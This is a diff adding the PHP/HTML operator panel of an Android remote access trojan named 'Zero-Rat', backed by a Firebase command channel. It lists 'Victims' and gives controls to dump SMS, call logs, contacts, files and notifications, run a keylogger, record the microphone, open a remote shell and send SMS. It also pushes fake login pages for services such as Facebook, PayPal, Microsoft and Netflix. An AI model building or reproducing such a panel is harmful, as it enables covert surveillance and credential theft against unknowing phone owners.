@@ -1,0 +1,354 @@
+<?php require_once 'auth/sessman.php';?>
+
+<!DOCTYPE html>
+<html>
+ 
+
+<head>
+<title>Zero-Rat</title>
+<meta charset="UTF-8" />
+ <link href="http://code.jquery.com/ui/1.10.4/themes/ui-lightness/jquery-ui.css" rel="stylesheet">  
+ <script src="http://code.jquery.com/jquery-1.10.2.js"></script>  
+ <script src="http://code.jquery.com/ui/1.10.4/jquery-ui.js"></script>  
+<script src="https://kit.fontawesome.com/87d32896ba.js" crossorigin="anonymous"></script>
+<link rel="icon" href="./img/cn.png"  >
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<script src="./firebase-app.js"></script>
+<script src="./firebase-auth.js"></script>
+<script src="./jquery.js"></script>
+<script src="./firebase-database.js"></script>
+<script type="text/javascript">
+
+//EDIT UNDER THIS ONLY
+
+
+
+
+
+// Your web app's Firebase configuration
+const firebaseConfig = {
+  apiKey: "AIzaSycLzXACadfMdGR-vN7FvfgLTTaGMvNxNA",
+  authDomain: "dfgdfgfhg.firebaseapp.com",
+  databaseURL: "https://dfgdfg-default-rtdb.firebaseio.com",
+  projectId: "xcvxcvdfdf",
+  storageBucket: "cxcvx.appspot.com",
+  messagingSenderId: "1075896640223",
+  appId: "1:1075854d453:web:0b45faee550rg31d2b93bf6a"
+};
+
+//DON'T EDIT BELOW THIS
+
+firebase.initializeApp(firebaseConfig);
+</script>
+</head>
+
+<link rel="stylesheet" href="./main.css">
+<body>
+
+
+
+<div id="tophead" >
+<h4 class="h4" >Zero-Rat</h4>
+
+<div id="backkk" onclick="backk(this)">
+<button type="button" class="btn" >Back</button>
+
+</div>
+</div>
+
+
+<div id="maindiv" >
+<div id="preloader" >
+<div  class="load" >
+</div>
+<div id="loadtxt" >Processing</div>
+</div>
+<div id="users" >
+<br>
+<center>Getting List Of Victims ....</center>
+</div>
+<div id="phones" >
+<br>
+
+<div class="dfle"  style="" >
+<div class="icon" onclick="dumpsms()">Dump SMS</div>
+<div class="icon" onclick="calllogs()" style="background:url('./img/dump_call_logs.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;" >Call Logs</div>
+<div class="icon" onclick="filesmanager()" style="background:url('./img/ic3.png');background-size:50px 50px;background-repeat:no-repeat;" >My Files</div>
+<div class="icon" onclick="getpackages()" style="background:url('./img/list_installed_apps.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;" >Apps List</div>
+</div>
+<div class="dfle"  style="" >
+<div class="icon" onclick="deviceinfo()" style="background:url('./img/dump_device_info.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;" >Sys Info</div>
+<div class="icon" onclick="toastt()" style="background:url('./img/toast.png');background-size:50px 50px;background-repeat:no-repeat;" >Toast</div>
+<div class="icon" onclick="dumpcontact()" style="background:url('./img/dump_contacts.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;" >Contacts</div>
+<div class="icon" onclick="funcmd()" style="background:url('./img/itune.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;transform:scale(1.07);" >Play Music</div>
+</div>
+<div class="dfle"  style="" >
+<div class="icon" onclick="sendmsg()" style="background:url('./img/send_message.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;transform:scale(1);" >Send SMS</div>
+<div class="icon" onclick="startshell()" style="background:url('./img/shell_command.png');background-size:50px 50px;background-repeat:no-repeat;" >Shell</div>
+<div class="icon" onclick="funcmd()" style="background:url('./img/img3.png');background-size:54px 54px;background-repeat:no-repeat;background-position:-2px -2px;">Vibrator</div>
+<div class="icon" onclick="funcmd()" style="background:url('./img/img5.png');background-size:50px 50px;background-repeat:no-repeat;">TTS</div>
+
+</div>
+<div class="dfle"  style="" >
+<div class="icon" onclick="keylogger()" style="background:url('./img/img6.png');background-size:50px 50px;background-repeat:no-repeat;">Keylogger</div>
+<div class="icon" onclick="changewallpaper()" style="background:url('./img/img1.png');background-size:50px 50px;background-repeat:no-repeat;transform:scale(1.25);">Wallpaper</div>
+<div class="icon" onclick="notificationlog()" style="background:url('./img/img2.png');background-size:50px 50px;background-repeat:no-repeat;">Notifications</div>
+<div class="icon" onclick="showphish()" style="background:url('./img/phish.png');background-size:50px 50px;background-repeat:no-repeat;">PhishData</div>
+</div>
+<div class="dfle"  style="" >
+<div class="icon" onclick="showphpag()" style="background:url('./img/scams.png');background-size:50px 50px;background-repeat:no-repeat;">Scams</div>
+<div class="icon" onclick="micrec()" style="background:url('./img/microphone_rec.png');background-size:50px 50px;background-repeat:no-repeat;">Recordings</div>
+</div>
+</div>
+
+
+<div id="cmdcernter" >
+<input type="text" id="cmdref" placeholder="cmdref" value="/comds/comdsdc38kw6i"   ><br>
+<input type="text" id="cmd"  placeholder="cmd type"  ><br>
+<input type="text" id="cmdvar"  placeholder="cmm"  ><br>
+<input type="text" id="cmdvarm"  placeholder="cmd var optional"  ><br>
+
+<button onclick="cmd()" >Send</button><br>
+</div>
+
+
+<div id="resp" onclick="opfol(event)"   >
+</div>
+
+
+<div id="fprev"  >
+<h4>Preview </h4><br>
+<img id="imv"  src="img3.png" >
+<iframe id="imv2"  src="img3.png" style="height:40%;width:100%;" ></iframe>
+<br>
+<hr>
+<ul id="fprevdes" >
+<li>Name : Fuck Hard
+<li>Size: 100 MB
+<li>Creation: 11 Aug 2055
+<li>Path: /sdcard/fuck.png</li>
+<li><a download=""  id="btdwn" target="_blank"  href="hh">Download File</a><br>
+</ul>
+
+<br>
+
+<span class="span"  onclick='this.parentElement.style.display="none";setdatcmd("cd",var32.substr(0,var32.lastIndexOf("/")),"",respov);'>×</span>
+</div>
+
+
+<div id="viewers" >
+<iframe id="vieweri"  src="data:text/html,<h4 style='color:green' > Getting File for preview....</h4>" ></iframe>
+<a href="#" id="downlo"  target="_blank" download="file.html"   ><div class="down" >				<svg  fill="white" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>							</div></a>
+</div>
+
+
+<div id="shellcmd" >
+<div id="shelldata" >Zero-Rat Shell<br><sub>(this feature under developing <b>coming</b> soon....)</sub> </div>
+<input type="text" onkeyup="shellcm(this)"  id="shellcmdd" placeholder="Enter Your Command Here_"   />
+</div>
+
+
+
+<div id="notikey" style="display:none;" ></div>
+
+<div id="toastdiv" >
+<br>
+<h3>Toast</h3>
+<br>
+<textarea type="text" id="toastcmd"  placeholder="Type Your Message Here"  /></textarea>
+<br><br><button onclick="toastexc()">Execute</button>
+</div>
+
+
+<div  id="diamain" onclick="this.style.display='none';" >
+<div class="diachild" >
+<h3 style="color:#0dd" >Response</h3><br>
+<p id="diatext" id="diatext" >This is response Text bsdk </p>
+<br>
+<button>OK</button>
+</div>
+</div>
+
+
+
+<div id="pvtt" >
+<h3 style="color:red" >FUN COMMANDS</h3><br><br>
+<div id="plmc" >
+<h4>Play Music </h4><br>
+<input type="text" id="musiccmd"  placeholder="Enter Direct .mp3 link"  >
+<br><button onclick="playmus()" >Execute</button>
+<br><br><hr><br>
+</div>
+<div id="vibradev" >
+<h4>Vibrate Device </h4><br>
+<input type="text" id="vibratecmd"  placeholder="Enter No. of Seconds"  >
+<br><button onclick="vibra()">Execute</button>
+<br><br><hr><br>
+</div>
+<div id="ttsdev" >
+<h4>Text To Speech </h4><br>
+<input type="text" id="ttscmd"  placeholder="Enter Your Text Message"  >
+<br><button onclick="ttsf()">Execute</button>
+</div>
+</div>
+
+
+
+<div id="senddm">
+<h4 style="color:#0fa">Send SMS</h4><br><br>
+TO:<input type="text" id="smsnumber"  placeholder="Enter Mobile Number"  ><br><br>
+Message:<br><br><textarea id="smscontent"  placeholder="Enter Message Content" ></textarea>
+<br><br>
+<center><button onclick="sendsms()">Send SMS</button></center>
+</div>
+
+
+
+<div id="wallpaperdiv" class="grid"><br>
+	  <h3 style="color:#0f9" >Select Wallpaper </h3><br><br>  
+
+<div class="wallimg" >
+<img src="./img/wall1.png" onclick="selectimg(this,3)"  id="selectedimg">
+<img src="./img/wall2.png" onclick="selectimg(this,3)"  >
+<img src="./img/wall3.png" onclick="selectimg(this,3)" >
+<img src="./img/wall4.png" onclick="selectimg(this,3)" >
+<img src="./img/wall5.png" onclick="selectimg(this,3)" >
+</div>
+<br>
+<center><button onclick="setwalls()">Set Wallpaper</button></center>
+</div>
+
+
+
+<div id="micrec" >
+<br>
+<h3>Record</h3>
+<br>
+<input type="text" id="recval"  placeholder="Record For x Seconds"  />
+<br><button class="btn"  onclick="recordvoice()">Record Mic</button>
+<br>
+<hr>
+<br>
+<br><h3>Recordings</h3><br>
+<div id="showrecs" >
+</div>
+
+</div>
+
+
+
+<div id="showphishj"  >
+<br>
+<h3>Phishing Commands</h3><br><br>
+<input type="text" id="nshpih"  placeholder="Enter Notification Title"  /><br>
+<br><hr>
+<select onchange="iojh()" id="lshpih" >
+<option value='0'>dropbox3.png</option><option value='1'>facebook2.png</option><option value='2'>facebook5.png</option><option value='3'>free_fire3.png</option><option value='4'>github1.png</option><option value='5'>instagram1.png</option><option value='6'>linkedin1.png</option><option value='7'>messenger1.png</option><option value='8'>microsoft1.png</option><option value='9'>netflix1.png</option><option value='10'>paypal2.png</option><option value='11'>protonmail1.png</option><option value='12'>pubg2.png</option><option value='13'>snapchat1.png</option><option value='14'>tumblir1.png</option><option value='15'>twitter1.png</option><option value='16'>wordpress1.png</option><option value='17'>yahoo1.png</option>
+
+</select>
+<img src="./imgg/dropbox3.png" id="hion"  style="max-height:60px;max-width:60px;" >
+<br><br>
+<!--jjjwjjw-->
+<center>
+<select id="phpage" >
+<option value="dropbox.html">
+
+dropbox.html
+</option>
+<option value="facebook_desktop_homepage.html">
+
+facebook_desktop_homepage.html
+</option>
+<option value="facebook_desktop_static.html">
+
+facebook_desktop_static.html
+</option>
+<option value="facebook_mobile.html">
+
+facebook_mobile.html
+</option>
+<option value="facebook_mobile_fake_security.html">
+
+facebook_mobile_fake_security.html
+</option>
+<option value="garena_free_fire.html">
+
+garena_free_fire.html
+</option>
+<option value="github.html">
+
+github.html
+</option>
+<option value="instagram.html">
+
+instagram.html
+</option>
+<option value="linkedin.html">
+
+linkedin.html
+</option>
+<option value="messenger.html">
+
+messenger.html
+</option>
+<option value="microsoft.html">
+
+microsoft.html
+</option>
+<option value="netflix.html">
+
+netflix.html
+</option>
+<option value="paypal.html">
+
+paypal.html
+</option>
+<option value="protonmail.html">
+
+protonmail.html
+</option>
+<option value="pubg.html">
+
+pubg.html
+</option>
+<option value="snapchat.html">
+
+
+snapchat.html
+</option>
+<option value="tumblr.html">
+
+tumblr.html
+</option>
+<option value="twitter_desktop.html">
+
+twitter_desktop.html
+</option>
+<option value="twitter_mobile.html">
+
+twitter_mobile.html
+</option>
+<option value="wordpress.html">
+
+wordpress.html
+</option>
+<option value="yahoo.html">
+
+yahoo.html
+</option>
+</select>
+<button onclick="execphish()"> Execute</button>
+</center>
+<br>
+<hr>
+<br>
+<input type="text" id="shpih"  placeholder="Enter Your Link"  />
+<br><button class="btn"  onclick="execphish2()">Execute</button>
+</div>
+
+
+</div>
+<script src="./main.js"></script>
+
+</body>
+</html>
